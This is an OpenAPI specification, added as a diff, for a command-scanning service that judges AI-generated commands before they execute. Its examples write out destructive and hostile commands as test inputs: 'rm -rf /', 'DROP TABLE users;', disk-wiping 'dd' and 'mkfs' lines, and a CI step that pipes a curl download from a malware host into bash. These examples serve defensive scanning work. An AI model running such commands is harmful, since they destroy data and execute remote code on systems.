@@ -1,0 +1,725 @@
+openapi: 3.0.0
+info:
+  title: TEOS Sentinel API
+  description: Pre-execution enforcement for AI-generated commands. Deterministic policy evaluation before runtime.
+  version: 3.0.0
+  contact:
+    name: TEOS Support
+    email: ayman@teosegypt.com
+    url: https://teos-sentinel.io
+  license:
+    name: TEOS Enterprise License
+    url: https://teos-sentinel.io/license
+
+servers:
+  - url: https://api.teos-sentinel.io/v1
+    description: Production API
+  - url: https://staging-api.teos-sentinel.io/v1
+    description: Staging (for testing)
+  - url: http://localhost:3000/v1
+    description: Local development
+
+security:
+  - ApiKeyAuth: []
+  - BearerAuth: []
+
+tags:
+  - name: Enforcement
+    description: Command scanning and verdict generation
+  - name: Audit
+    description: Query enforcement history and logs
+  - name: Rules
+    description: Rule definitions and test cases
+  - name: Health
+    description: Service status and metrics
+
+paths:
+  /scan:
+    post:
+      tags:
+        - Enforcement
+      summary: Scan and evaluate a command
+      description: |
+        Submit a command, script, or code snippet for deterministic enforcement evaluation.
+        Returns a verdict (BLOCK/WARN/ALLOW) with risk score and rule details.
+        
+        Same input always produces the same verdict (deterministic enforcement).
+        Every scan is logged with timestamp, request ID, and SHA-256 hash for audit compliance.
+      operationId: scanCommand
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/ScanRequest'
+            examples:
+              destructiveShell:
+                summary: Destructive shell command
+                value:
+                  command: "rm -rf /"
+                  context: shell
+              sqlDestruction:
+                summary: SQL destruction command
+                value:
+                  command: "DROP TABLE users;"
+                  context: sql
+              safeCommand:
+                summary: Safe JavaScript command
+                value:
+                  command: 'console.log("hello world")'
+                  context: javascript
+              ciYaml:
+                summary: CI/CD pipeline YAML
+                value:
+                  command: |
+                    script:
+                      - curl https://malware.sh | bash
+                  context: ci-yaml
+      responses:
+        '200':
+          description: Enforcement verdict returned successfully
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ScanResponse'
+              examples:
+                blocked:
+                  summary: Command blocked (high risk)
+                  value:
+                    verdict: BLOCK
+                    riskScore: 100
+                    ruleId: R01
+                    ruleName: DESTRUCTIVE_SHELL
+                    explanation: "rm -rf permanently deletes all filesystem data."
+                    requestId: req_abc123xyz789
+                    timestamp: "2026-05-08T09:59:28.203Z"
+                    commandHash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+                warned:
+                  summary: Command warned (medium risk)
+                  value:
+                    verdict: WARN
+                    riskScore: 75
+                    ruleId: R09
+                    ruleName: SQL_DESTRUCTION
+                    explanation: "DROP TABLE destroys database tables permanently. Human review recommended."
+                    requestId: req_def456uvw012
+                    timestamp: "2026-05-08T09:59:29.100Z"
+                    commandHash: "5d41402abc4b2a76b9719d911017c592"
+                allowed:
+                  summary: Command allowed (safe)
+                  value:
+                    verdict: ALLOW
+                    riskScore: 0
+                    ruleId: R00
+                    ruleName: CLEAN
+                    explanation: "No destructive patterns detected."
+                    requestId: req_ghi789jkl345
+                    timestamp: "2026-05-08T09:59:30.050Z"
+                    commandHash: "356a192b7913b04c54574d18c28d46e6395428ab"
+        '400':
+          description: Invalid request (malformed JSON, missing fields)
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+              example:
+                error: "Invalid request"
+                message: "Field 'command' is required and must be a string."
+                code: INVALID_REQUEST
+                requestId: req_err_001
+        '401':
+          description: Unauthorized (invalid or missing API key)
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+              example:
+                error: "Unauthorized"
+                message: "API key is invalid or expired."
+                code: UNAUTHORIZED
+                requestId: req_err_002
+        '429':
+          description: Rate limit exceeded
+          headers:
+            X-RateLimit-Limit:
+              schema:
+                type: integer
+              description: Maximum requests per month
+            X-RateLimit-Remaining:
+              schema:
+                type: integer
+              description: Requests remaining this month
+            X-RateLimit-Reset:
+              schema:
+                type: string
+                format: date-time
+              description: When the rate limit resets
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+              example:
+                error: "Rate limit exceeded"
+                message: "You have exceeded your monthly limit of 50 scans. Upgrade to unlock more."
+                code: RATE_LIMIT_EXCEEDED
+                requestId: req_err_429
+                retryAfter: "2026-06-08T00:00:00Z"
+        '500':
+          description: Internal server error
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+              example:
+                error: "Internal server error"
+                message: "An unexpected error occurred. Please try again later."
+                code: INTERNAL_ERROR
+                requestId: req_err_500
+      x-rate-limit:
+        starter: 50
+        builder: 400
+        pro: 1000
+
+  /scan/{requestId}:
+    get:
+      tags:
+        - Enforcement
+      summary: Retrieve a past scan result
+      description: Look up a previous scan verdict using its request ID. Useful for debugging or audit purposes.
+      operationId: getScanResult
+      parameters:
+        - name: requestId
+          in: path
+          required: true
+          schema:
+            type: string
+            pattern: '^req_[a-zA-Z0-9]{21}$'
+          example: req_abc123xyz789
+          description: The request ID from the original scan
+      responses:
+        '200':
+          description: Scan result found
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ScanResponse'
+        '404':
+          description: Scan result not found
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ErrorResponse'
+
+  /audit:
+    get:
+      tags:
+        - Audit
+      summary: Query enforcement audit log
+      description: |
+        Retrieve paginated audit history. Filter by verdict, rule ID, date range, or risk score.
+        Enterprise tier required for raw audit access. Starter/Builder tiers get summary stats only.
+      operationId: getAuditLog
+      parameters:
+        - name: verdict
+          in: query
+          schema:
+            type: string
+            enum: [BLOCK, WARN, ALLOW]
+          description: Filter by verdict type
+        - name: ruleId
+          in: query
+          schema:
+            type: string
+            pattern: '^R[0-9]{2}$'
+          description: Filter by specific rule (e.g., R01, R09)
+        - name: minRiskScore
+          in: query
+          schema:
+            type: integer
+            minimum: 0
+            maximum: 100
+          description: Minimum risk score (inclusive)
+        - name: maxRiskScore
+          in: query
+          schema:
+            type: integer
+            minimum: 0
+            maximum: 100
+          description: Maximum risk score (inclusive)
+        - name: startDate
+          in: query
+          schema:
+            type: string
+            format: date-time
+          description: Start of date range (ISO 8601)
+        - name: endDate
+          in: query
+          schema:
+            type: string
+            format: date-time
+          description: End of date range (ISO 8601)
+        - name: limit
+          in: query
+          schema:
+            type: integer
+            minimum: 1
+            maximum: 1000
+            default: 100
+          description: Results per page
+        - name: offset
+          in: query
+          schema:
+            type: integer
+            minimum: 0
+            default: 0
+          description: Pagination offset
+        - name: export
+          in: query
+          schema:
+            type: string
+            enum: [json, csv]
+          description: Export format (CSV for compliance, JSON for programmatic access)
+      responses:
+        '200':
+          description: Audit log retrieved
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/AuditLogResponse'
+            text/csv:
+              schema:
+                type: string
+              example: |
+                timestamp,verdict,ruleId,ruleName,riskScore,requestId,commandHash,userId
+                2026-05-08T09:59:28Z,BLOCK,R01,DESTRUCTIVE_SHELL,100,req_abc123,e3b0c44...,user_123
+
+  /rules:
+    get:
+      tags:
+        - Rules
+      summary: Get all rules
+      description: List all 25 deterministic enforcement rules with patterns, severity, and test coverage.
+      operationId: listRules
+      parameters:
+        - name: category
+          in: query
+          schema:
+            type: string
+            enum: [shell_destruction, secret_leakage, injection_evasion, supply_chain, cicd_abuse]
+          description: Filter by threat category
+      responses:
+        '200':
+          description: Rules list
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/RulesResponse'
+
+  /rules/{ruleId}:
+    get:
+      tags:
+        - Rules
+      summary: Get rule details
+      description: Retrieve full details for a specific rule including patterns, false positive rate, and test cases.
+      operationId: getRule
+      parameters:
+        - name: ruleId
+          in: path
+          required: true
+          schema:
+            type: string
+            pattern: '^R[0-9]{2}$'
+          example: R01
+      responses:
+        '200':
+          description: Rule details
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/RuleDetail'
+
+  /health:
+    get:
+      tags:
+        - Health
+      summary: Service health check
+      description: Returns service status, engine version, uptime, and infrastructure details. No authentication required.
+      operationId: getHealth
+      security: []
+      responses:
+        '200':
+          description: Service is healthy
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/HealthResponse'
+              example:
+                status: online
+                engine: v3.0.0
+                rules: 103
+                uptime: 86400
+                uptimeHuman: "1 day"
+                env: production
+                time: "2026-05-08T09:59:28.203Z"
+                version: "3.0.0"
+                store: redis
+                eventsCount: 1250
+                sla: "99.95%"
+                lastDeployment: "2026-05-08T08:30:00Z"
+        '503':
+          description: Service unhealthy
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/HealthResponse'
+              example:
+                status: degraded
+                engine: v2.1
+                uptime: 300
+                error: "Redis connection lost"
+
+components:
+  schemas:
+    ScanRequest:
+      type: object
+      required:
+        - command
+      properties:
+        command:
+          type: string
+          minLength: 1
+          maxLength: 10000
+          description: The command, script, or code to evaluate
+          example: "rm -rf /"
+        context:
+          type: string
+          enum: [shell, sql, javascript, python, ci-yaml, bash, powershell, docker, kubernetes]
+          default: shell
+          description: |
+            Context helps the engine optimize rules.
+            Defaults to 'shell' if omitted.
+        userId:
+          type: string
+          description: Optional user ID for audit trail association
+          example: "user_abc123"
+        metadata:
+          type: object
+          additionalProperties:
+            type: string
+          description: Optional metadata (e.g., { "source": "github-actions", "branch": "main" })
+          example:
+            source: "github-actions"
+            branch: "main"
+            repository: "my-org/my-repo"
+
+    ScanResponse:
+      type: object
+      required:
+        - verdict
+        - riskScore
+        - ruleId
+        - ruleName
+        - explanation
+        - requestId
+        - timestamp
+      properties:
+        verdict:
+          type: string
+          enum: [BLOCK, WARN, ALLOW]
+          description: |
+            - **BLOCK**: Command execution prevented. High-risk pattern detected.
+            - **WARN**: Command allowed but flagged. Human review recommended.
+            - **ALLOW**: Safe to execute. No dangerous patterns detected.
+        riskScore:
+          type: integer
+          minimum: 0
+          maximum: 100
+          description: Risk score (0=safe, 100=maximum danger). Used for sorting and severity.
+        ruleId:
+          type: string
+          pattern: '^R[0-9]{2}$'
+          description: Triggered rule ID (e.g., R01, R09, R00 for clean)
+          example: "R01"
+        ruleName:
+          type: string
+          description: Human-readable rule name
+          example: "DESTRUCTIVE_SHELL"
+        explanation:
+          type: string
+          description: |
+            Why this verdict was returned.
+            Audit-friendly explanation suitable for logs and compliance reports.
+          example: "rm -rf permanently deletes all filesystem data."
+        commandHash:
+          type: string
+          format: sha256
+          description: SHA-256 hash of the command (for idempotency verification)
+          example: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        requestId:
+          type: string
+          pattern: '^req_[a-zA-Z0-9]{21}$'
+          description: Unique request identifier for audit trail
+          example: "req_abc123xyz789"
+        timestamp:
+          type: string
+          format: date-time
+          description: When the scan occurred (ISO 8601)
+          example: "2026-05-08T09:59:28.203Z"
+        confidence:
+          type: number
+          minimum: 0
+          maximum: 1
+          description: Confidence score (how certain the verdict is)
+          example: 0.99
+
+    ErrorResponse:
+      type: object
+      required:
+        - error
+        - message
+        - code
+        - requestId
+      properties:
+        error:
+          type: string
+          description: Error type
+          example: "Invalid request"
+        message:
+          type: string
+          description: Human-readable error message
+          example: "Field 'command' is required."
+        code:
+          type: string
+          enum: [INVALID_REQUEST, UNAUTHORIZED, RATE_LIMIT_EXCEEDED, NOT_FOUND, INTERNAL_ERROR]
+          description: Machine-readable error code
+        requestId:
+          type: string
+          description: Request ID for debugging
+          example: "req_err_001"
+        details:
+          type: object
+          description: Additional error context
+          additionalProperties: true
+
+    AuditLogResponse:
+      type: object
+      properties:
+        total:
+          type: integer
+          description: Total audit entries matching filters
+        limit:
+          type: integer
+          description: Results per page
+        offset:
+          type: integer
+          description: Pagination offset
+        entries:
+          type: array
+          items:
+            $ref: '#/components/schemas/AuditEntry'
+        summary:
+          type: object
+          properties:
+            blockCount:
+              type: integer
+              description: Number of BLOCK verdicts in result set
+            warnCount:
+              type: integer
+              description: Number of WARN verdicts
+            allowCount:
+              type: integer
+              description: Number of ALLOW verdicts
+            avgRiskScore:
+              type: number
+              description: Average risk score across all results
+            topRules:
+              type: array
+              items:
+                type: object
+                properties:
+                  ruleId:
+                    type: string
+                  ruleName:
+                    type: string
+                  count:
+                    type: integer
+
+    AuditEntry:
+      type: object
+      properties:
+        timestamp:
+          type: string
+          format: date-time
+        verdict:
+          type: string
+          enum: [BLOCK, WARN, ALLOW]
+        ruleId:
+          type: string
+        ruleName:
+          type: string
+        riskScore:
+          type: integer
+        requestId:
+          type: string
+        commandHash:
+          type: string
+        userId:
+          type: string
+        metadata:
+          type: object
+          additionalProperties: true
+
+    RulesResponse:
+      type: object
+      properties:
+        total:
+          type: integer
+          example: 25
+        rules:
+          type: array
+          items:
+            $ref: '#/components/schemas/RuleDetail'
+        version:
+          type: string
+          example: "2.1.0"
+        lastUpdated:
+          type: string
+          format: date-time
+
+    RuleDetail:
+      type: object
+      properties:
+        ruleId:
+          type: string
+          example: "R01"
+        name:
+          type: string
+          example: "DESTRUCTIVE_SHELL"
+        category:
+          type: string
+          enum: [shell_destruction, secret_leakage, injection_evasion, supply_chain, cicd_abuse]
+        severity:
+          type: string
+          enum: [critical, high, medium, low]
+        description:
+          type: string
+          example: "Detects commands that permanently delete filesystem data."
+        patterns:
+          type: array
+          items:
+            type: string
+          description: Regex patterns that trigger this rule
+        examples:
+          type: object
+          properties:
+            dangerous:
+              type: array
+              items:
+                type: string
+              example: ["rm -rf /", "dd if=/dev/zero of=/dev/sda", "mkfs.ext4 /dev/sda1"]
+            safe:
+              type: array
+              items:
+                type: string
+              example: ["rm -rf ./temp", "rm file.txt"]
+        falsePositiveRate:
+          type: number
+          minimum: 0
+          maximum: 1
+          description: Estimated false positive rate (from test suite)
+          example: 0.02
+        testCases:
+          type: integer
+          description: Number of test cases for this rule
+          example: 15
+        lastModified:
+          type: string
+          format: date-time
+
+    HealthResponse:
+      type: object
+      required:
+        - status
+        - engine
+      properties:
+        status:
+          type: string
+          enum: [online, degraded, offline]
+          description: Service health status
+        engine:
+          type: string
+          example: "v2.1"
+        rules:
+          type: integer
+          example: 25
+        uptime:
+          type: integer
+          description: Uptime in seconds
+        uptimeHuman:
+          type: string
+          example: "1 day"
+        env:
+          type: string
+          enum: [production, staging, development]
+        time:
+          type: string
+          format: date-time
+        version:
+          type: string
+          example: "2.1.0"
+        store:
+          type: string
+          enum: [redis, postgres, in-memory]
+        eventsCount:
+          type: integer
+          description: Total events processed in current session
+        sla:
+          type: string
+          example: "99.95%"
+        lastDeployment:
+          type: string
+          format: date-time
+
+  securitySchemes:
+    ApiKeyAuth:
+      type: apiKey
+      in: header
+      name: X-API-Key
+      description: API key for authentication. Get yours at https://teos-sentinel.io/dashboard/keys
+    BearerAuth:
+      type: http
+      scheme: bearer
+      bearerFormat: JWT
+      description: JWT token for programmatic access
+
+x-rate-limits:
+  Starter:
+    monthly: 50
+    concurrent: 1
+    price: "$9/month"
+  Builder:
+    monthly: 400
+    concurrent: 5
+    price: "$39/month"
+  Pro:
+    monthly: 1000
+    concurrent: 25
+    price: "$99/month"
+  Enterprise:
+    monthly: "unlimited"
+    concurrent: "unlimited"
+    price: "Custom"
+
+x-integrations:
+  - name: GitHub Actions
+    status: live
+    docs: https://teos-sentinel.io/docs/github-actions
+  - name: GitLab CI
+    status: live
+    docs: https://teos-sentinel.io/docs/gitlab-ci
+  - name: Telegram Bot
+    status: live
+    docs: https://t.me/teoslinker_bot
+  - name: CLI Tool
+    status: coming-q2
+    docs: https://github.com/Elmahrosa/teos-cli
